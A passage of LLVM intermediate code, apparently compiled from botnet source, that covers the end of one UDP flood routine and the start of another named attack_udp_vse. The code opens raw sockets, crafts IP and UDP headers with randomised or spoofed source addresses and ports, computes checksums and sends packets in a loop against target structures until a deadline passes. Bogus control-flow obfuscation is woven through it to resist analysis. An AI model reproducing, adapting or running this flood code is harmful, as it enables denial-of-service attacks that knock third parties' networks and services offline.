  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBBpart211, label %originalBB1alteredBB

originalBBpart211:                                ; preds = %originalBB1
  br label %109

; <label>:210:                                    ; preds = %109
  br label %211

; <label>:211:                                    ; preds = %489, %210
  store i32 0, i32* %11, align 4
  br label %212

; <label>:212:                                    ; preds = %464, %211
  %213 = load i32, i32* %11, align 4
  %214 = load i8, i8* %7, align 1
  %215 = zext i8 %214 to i32
  %216 = icmp slt i32 %213, %215
  br i1 %216, label %217, label %467

; <label>:217:                                    ; preds = %212
  %218 = load i32, i32* @x.29
  %219 = load i32, i32* @y.30
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %217
  %226 = load i8**, i8*** %13, align 8
  %227 = load i32, i32* %11, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds i8*, i8** %226, i64 %228
  %230 = load i8*, i8** %229, align 8
  store i8* %230, i8** %26, align 8
  %231 = load i8*, i8** %26, align 8
  %232 = bitcast i8* %231 to %struct.iphdr*
  store %struct.iphdr* %232, %struct.iphdr** %27, align 8
  %233 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i64 1
  %235 = bitcast %struct.iphdr* %234 to %struct.udphdr*
  store %struct.udphdr* %235, %struct.udphdr** %28, align 8
  %236 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %237 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %236, i64 1
  %238 = bitcast %struct.udphdr* %237 to i8*
  store i8* %238, i8** %29, align 8
  %239 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %240 = load i32, i32* %11, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %239, i64 %241
  %243 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %242, i32 0, i32 2
  %244 = load i8, i8* %243, align 4
  %245 = zext i8 %244 to i32
  %246 = icmp slt i32 %245, 32
  %247 = load i32, i32* @x.29
  %248 = load i32, i32* @y.30
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br i1 %246, label %255, label %292

; <label>:255:                                    ; preds = %originalBBpart215
  %256 = load i32, i32* @x.29
  %257 = load i32, i32* @y.30
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %255
  %264 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %265 = load i32, i32* %11, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %264, i64 %266
  %268 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %267, i32 0, i32 1
  %269 = load i32, i32* %268, align 4
  %270 = call i32 @ntohl(i32 %269) #7
  %271 = call i32 @rand_next()
  %272 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %273 = load i32, i32* %11, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %272, i64 %274
  %276 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %275, i32 0, i32 2
  %277 = load i8, i8* %276, align 4
  %278 = zext i8 %277 to i32
  %279 = lshr i32 %271, %278
  %280 = add i32 %270, %279
  %281 = call i32 @htonl(i32 %280) #7
  %282 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 9
  store i32 %281, i32* %283, align 4
  %284 = load i32, i32* @x.29
  %285 = load i32, i32* @y.30
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBBpart237, label %originalBB17alteredBB

originalBBpart237:                                ; preds = %originalBB17
  br label %292

; <label>:292:                                    ; preds = %originalBBpart237, %originalBBpart215
  %293 = load i32, i32* @x.29
  %294 = load i32, i32* @y.30
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %292
  %301 = load i32, i32* %22, align 4
  %302 = icmp eq i32 %301, -1
  %303 = load i32, i32* @x.29
  %304 = load i32, i32* @y.30
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br i1 %302, label %311, label %315

; <label>:311:                                    ; preds = %originalBBpart241
  %312 = call i32 @rand_next()
  %313 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %314 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %313, i32 0, i32 8
  store i32 %312, i32* %314, align 4
  br label %315

; <label>:315:                                    ; preds = %311, %originalBBpart241
  %316 = load i16, i16* %15, align 2
  %317 = zext i16 %316 to i32
  %318 = icmp eq i32 %317, 65535
  br i1 %318, label %319, label %340

; <label>:319:                                    ; preds = %315
  %320 = load i32, i32* @x.29
  %321 = load i32, i32* @y.30
  %322 = sub i32 %320, 1
  %323 = mul i32 %320, %322
  %324 = urem i32 %323, 2
  %325 = icmp eq i32 %324, 0
  %326 = icmp slt i32 %321, 10
  %327 = or i1 %325, %326
  br i1 %327, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %319
  %328 = call i32 @rand_next()
  %329 = trunc i32 %328 to i16
  %330 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 3
  store i16 %329, i16* %331, align 4
  %332 = load i32, i32* @x.29
  %333 = load i32, i32* @y.30
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %340

; <label>:340:                                    ; preds = %originalBBpart245, %315
  %341 = load i32, i32* @x.29
  %342 = load i32, i32* @y.30
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %340
  %349 = load i16, i16* %18, align 2
  %350 = zext i16 %349 to i32
  %351 = icmp eq i32 %350, 65535
  %352 = load i32, i32* @x.29
  %353 = load i32, i32* @y.30
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br i1 %351, label %360, label %365

; <label>:360:                                    ; preds = %originalBBpart249
  %361 = call i32 @rand_next()
  %362 = trunc i32 %361 to i16
  %363 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %364 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %363, i32 0, i32 0
  store i16 %362, i16* %364, align 2
  br label %365

; <label>:365:                                    ; preds = %360, %originalBBpart249
  %366 = load i16, i16* %19, align 2
  %367 = zext i16 %366 to i32
  %368 = icmp eq i32 %367, 65535
  br i1 %368, label %369, label %390

; <label>:369:                                    ; preds = %365
  %370 = load i32, i32* @x.29
  %371 = load i32, i32* @y.30
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %369
  %378 = call i32 @rand_next()
  %379 = trunc i32 %378 to i16
  %380 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %381 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %380, i32 0, i32 1
  store i16 %379, i16* %381, align 2
  %382 = load i32, i32* @x.29
  %383 = load i32, i32* @y.30
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %390

; <label>:390:                                    ; preds = %originalBBpart253, %365
  %391 = load i32, i32* @x.29
  %392 = load i32, i32* @y.30
  %393 = sub i32 %391, 1
  %394 = mul i32 %391, %393
  %395 = urem i32 %394, 2
  %396 = icmp eq i32 %395, 0
  %397 = icmp slt i32 %392, 10
  %398 = or i1 %396, %397
  br i1 %398, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %390
  %399 = load i8, i8* %21, align 1
  %400 = icmp ne i8 %399, 0
  %401 = load i32, i32* @x.29
  %402 = load i32, i32* @y.30
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br i1 %400, label %409, label %417

; <label>:409:                                    ; preds = %originalBBpart257
  %410 = load i8*, i8** %29, align 8
  %411 = load i16, i16* %20, align 2
  %412 = zext i16 %411 to i32
  call void @rand_alphastr(i8* %410, i32 %412)
  %413 = load i8*, i8** %29, align 8
  %414 = load i16, i16* %20, align 2
  %415 = zext i16 %414 to i64
  %416 = getelementptr inbounds i8, i8* %413, i64 %415
  store i8 0, i8* %416, align 1
  br label %417

; <label>:417:                                    ; preds = %409, %originalBBpart257
  %418 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %419 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %418, i32 0, i32 7
  store i16 0, i16* %419, align 2
  %420 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %421 = bitcast %struct.iphdr* %420 to i16*
  %422 = call zeroext i16 @checksum_generic(i16* %421, i32 20)
  %423 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i32 0, i32 7
  store i16 %422, i16* %424, align 2
  %425 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %426 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %425, i32 0, i32 3
  store i16 0, i16* %426, align 2
  %427 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %428 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %429 = bitcast %struct.udphdr* %428 to i8*
  %430 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %431 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %430, i32 0, i32 2
  %432 = load i16, i16* %431, align 2
  %433 = load i16, i16* %20, align 2
  %434 = zext i16 %433 to i64
  %435 = add i64 8, %434
  %436 = trunc i64 %435 to i32
  %437 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %427, i8* %429, i16 zeroext %432, i32 %436)
  %438 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %439 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %438, i32 0, i32 3
  store i16 %437, i16* %439, align 2
  %440 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %441 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %440, i32 0, i32 1
  %442 = load i16, i16* %441, align 2
  %443 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %444 = load i32, i32* %11, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i64 %445
  %447 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %446, i32 0, i32 0
  %448 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %447, i32 0, i32 1
  store i16 %442, i16* %448, align 2
  %449 = load i32, i32* %12, align 4
  %450 = load i8*, i8** %26, align 8
  %451 = load i16, i16* %20, align 2
  %452 = zext i16 %451 to i64
  %453 = add i64 28, %452
  %454 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %455 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %456 = load i32, i32* %11, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %455, i64 %457
  %459 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %458, i32 0, i32 0
  %460 = bitcast %struct.sockaddr_in* %459 to %struct.sockaddr*
  store %struct.sockaddr* %460, %struct.sockaddr** %454, align 8
  %461 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %462 = load %struct.sockaddr*, %struct.sockaddr** %461, align 8
  %463 = call i64 @sendto(i32 %449, i8* %450, i64 %453, i32 16384, %struct.sockaddr* %462, i32 16)
  br label %464

; <label>:464:                                    ; preds = %417
  %465 = load i32, i32* %11, align 4
  %466 = add nsw i32 %465, 1
  store i32 %466, i32* %11, align 4
  br label %212

; <label>:467:                                    ; preds = %212
  %468 = load i32, i32* @x.29
  %469 = load i32, i32* @y.30
  %470 = sub i32 %468, 1
  %471 = mul i32 %468, %470
  %472 = urem i32 %471, 2
  %473 = icmp eq i32 %472, 0
  %474 = icmp slt i32 %469, 10
  %475 = or i1 %473, %474
  br i1 %475, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %467
  %476 = call i64 @time(i64* null) #6
  %477 = load i32, i32* %23, align 4
  %478 = sext i32 %477 to i64
  %479 = icmp sgt i64 %476, %478
  %480 = load i32, i32* @x.29
  %481 = load i32, i32* @y.30
  %482 = sub i32 %480, 1
  %483 = mul i32 %480, %482
  %484 = urem i32 %483, 2
  %485 = icmp eq i32 %484, 0
  %486 = icmp slt i32 %481, 10
  %487 = or i1 %485, %486
  br i1 %487, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br i1 %479, label %488, label %489

; <label>:488:                                    ; preds = %originalBBpart261
  br label %490

; <label>:489:                                    ; preds = %originalBBpart261
  br label %211

; <label>:490:                                    ; preds = %488, %105, %99
  %491 = load i32, i32* @x.29
  %492 = load i32, i32* @y.30
  %493 = sub i32 %491, 1
  %494 = mul i32 %491, %493
  %495 = urem i32 %494, 2
  %496 = icmp eq i32 %495, 0
  %497 = icmp slt i32 %492, 10
  %498 = or i1 %496, %497
  br i1 %498, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %490
  %499 = load i32, i32* @x.29
  %500 = load i32, i32* @y.30
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %80
  %507 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %507, i32* %12, align 4
  %508 = icmp eq i32 %507, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %191
  %509 = load i32, i32* %11, align 4
  %_ = sub i32 %509, 1
  %gen = mul i32 %_, 1
  %_2 = sub i32 0, %509
  %gen3 = add i32 %_2, 1
  %_4 = sub i32 %509, 1
  %gen5 = mul i32 %_4, 1
  %_6 = shl i32 %509, 1
  %_7 = shl i32 %509, 1
  %_8 = sub i32 %509, 1
  %gen9 = mul i32 %_8, 1
  %510 = add nsw i32 %509, 1
  store i32 %510, i32* %11, align 4
  br label %originalBB1

originalBB13alteredBB:                            ; preds = %originalBB13, %217
  %511 = load i8**, i8*** %13, align 8
  %512 = load i32, i32* %11, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds i8*, i8** %511, i64 %513
  %515 = load i8*, i8** %514, align 8
  store i8* %515, i8** %26, align 8
  %516 = load i8*, i8** %26, align 8
  %517 = bitcast i8* %516 to %struct.iphdr*
  store %struct.iphdr* %517, %struct.iphdr** %27, align 8
  %518 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %519 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %518, i64 1
  %520 = bitcast %struct.iphdr* %519 to %struct.udphdr*
  store %struct.udphdr* %520, %struct.udphdr** %28, align 8
  %521 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %522 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %521, i64 1
  %523 = bitcast %struct.udphdr* %522 to i8*
  store i8* %523, i8** %29, align 8
  %524 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %525 = load i32, i32* %11, align 4
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %524, i64 %526
  %528 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %527, i32 0, i32 2
  %529 = load i8, i8* %528, align 4
  %530 = zext i8 %529 to i32
  %531 = icmp slt i32 %530, 32
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %255
  %532 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %533 = load i32, i32* %11, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %532, i64 %534
  %536 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %535, i32 0, i32 1
  %537 = load i32, i32* %536, align 4
  %538 = call i32 @ntohl(i32 %537) #7
  %539 = call i32 @rand_next()
  %540 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %541 = load i32, i32* %11, align 4
  %542 = sext i32 %541 to i64
  %543 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %540, i64 %542
  %544 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %543, i32 0, i32 2
  %545 = load i8, i8* %544, align 4
  %546 = zext i8 %545 to i32
  %_18 = shl i32 %539, %546
  %_19 = shl i32 %539, %546
  %_20 = sub i32 %539, %546
  %gen21 = mul i32 %_20, %546
  %_22 = sub i32 %539, %546
  %gen23 = mul i32 %_22, %546
  %_24 = sub i32 0, %539
  %gen25 = add i32 %_24, %546
  %_26 = sub i32 %539, %546
  %gen27 = mul i32 %_26, %546
  %547 = lshr i32 %539, %546
  %_28 = sub i32 %538, %547
  %gen29 = mul i32 %_28, %547
  %_30 = sub i32 0, %538
  %gen31 = add i32 %_30, %547
  %_32 = sub i32 0, %538
  %gen33 = add i32 %_32, %547
  %_34 = sub i32 %538, %547
  %gen35 = mul i32 %_34, %547
  %548 = add i32 %538, %547
  %549 = call i32 @htonl(i32 %548) #7
  %550 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %551 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %550, i32 0, i32 9
  store i32 %549, i32* %551, align 4
  br label %originalBB17

originalBB39alteredBB:                            ; preds = %originalBB39, %292
  %552 = load i32, i32* %22, align 4
  %553 = icmp eq i32 %552, -1
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %319
  %554 = call i32 @rand_next()
  %555 = trunc i32 %554 to i16
  %556 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %557 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %556, i32 0, i32 3
  store i16 %555, i16* %557, align 4
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %340
  %558 = load i16, i16* %18, align 2
  %559 = zext i16 %558 to i32
  %560 = icmp eq i32 %559, 65535
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %369
  %561 = call i32 @rand_next()
  %562 = trunc i32 %561 to i16
  %563 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %564 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %563, i32 0, i32 1
  store i16 %562, i16* %564, align 2
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %390
  %565 = load i8, i8* %21, align 1
  %566 = icmp ne i8 %565, 0
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %467
  %567 = call i64 @time(i64* null) #6
  %568 = load i32, i32* %23, align 4
  %569 = sext i32 %568 to i64
  %570 = icmp sgt i64 %567, %569
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %490
  br label %originalBB63
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.udphdr*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 8) #6
  %33 = bitcast i8* %32 to i8**
  store i8** %33, i8*** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 2, i32 0)
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* %14, align 1
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 3, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 4, i32 64)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %16, align 1
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 5, i32 0)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = load i8, i8* %9, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 6, i32 65535)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %18, align 2
  %54 = load i8, i8* %9, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 7, i32 27015)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %19, align 2
  store i32 0, i32* %21, align 4
  %58 = call i64 @time(i64* null) #6
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = add nsw i64 %58, %60
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %22, align 4
  call void @table_unlock_val(i8 zeroext 36)
  %63 = call i8* @table_retrieve_val(i32 36, i32* %21)
  store i8* %63, i8** %20, align 8
  %64 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %64, i32* %12, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %5
  br label %478

; <label>:67:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %68 = load i32, i32* %12, align 4
  %69 = bitcast i32* %11 to i8*
  %70 = call i32 @setsockopt(i32 %68, i32 0, i32 3, i8* %69, i32 4) #6
  %71 = icmp eq i32 %70, -1
  br i1 %71, label %72, label %91

; <label>:72:                                     ; preds = %67
  %73 = load i32, i32* @x.31
  %74 = load i32, i32* @y.32
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %72
  %81 = load i32, i32* %12, align 4
  %82 = call i32 @close(i32 %81)
  %83 = load i32, i32* @x.31
  %84 = load i32, i32* @y.32
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %478

; <label>:91:                                     ; preds = %67
  %92 = load i32, i32* @x.31
  %93 = load i32, i32* @y.32
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %91
  store i32 0, i32* %11, align 4
  %100 = load i32, i32* @x.31
  %101 = load i32, i32* @y.32
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %108

; <label>:108:                                    ; preds = %216, %originalBBpart24
  %109 = load i32, i32* %11, align 4
  %110 = load i8, i8* %7, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %219

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 128, i64 1) #6
  %115 = load i8**, i8*** %13, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %13, align 8
  %120 = load i32, i32* %11, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %23, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.udphdr*
  store %struct.udphdr* %127, %struct.udphdr** %24, align 8
  %128 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %129 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %128, i64 1
  %130 = bitcast %struct.udphdr* %129 to i8*
  store i8* %130, i8** %25, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = and i8 %133, 15
  %135 = or i8 %134, 64
  store i8 %135, i8* %132, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %137 = bitcast %struct.iphdr* %136 to i8*
  %138 = load i8, i8* %137, align 4
  %139 = and i8 %138, -16
  %140 = or i8 %139, 5
  store i8 %140, i8* %137, align 4
  %141 = load i8, i8* %14, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 1
  store i8 %141, i8* %143, align 1
  %144 = load i32, i32* %21, align 4
  %145 = sext i32 %144 to i64
  %146 = add i64 32, %145
  %147 = trunc i64 %146 to i16
